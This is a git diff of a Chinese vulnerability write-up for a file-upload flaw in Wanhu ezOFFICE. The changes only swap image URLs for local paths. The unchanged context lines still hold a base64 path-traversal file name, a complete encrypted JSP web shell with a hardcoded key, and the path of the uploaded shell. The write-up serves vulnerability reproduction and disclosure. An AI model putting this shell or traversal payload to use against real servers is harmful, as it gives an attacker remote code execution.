@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![image-20220824142451484](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241424573.png)
+![image-20220824142451484](./images/202208241424573.png)
 
 发送请求包
 
@@ -52,7 +52,7 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
 <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 ```
 
-![image-20220824142511911](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241425970.png)
+![image-20220824142511911](./images/202208241425970.png)
 
 上传后的目录为
 
@@ -60,4 +60,4 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
 /defaultroot/public/edit/cmd_test.jsp
 ```
 
-![image-20220824142536837](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241425906.png)
+![image-20220824142536837](./images/202208241425906.png)
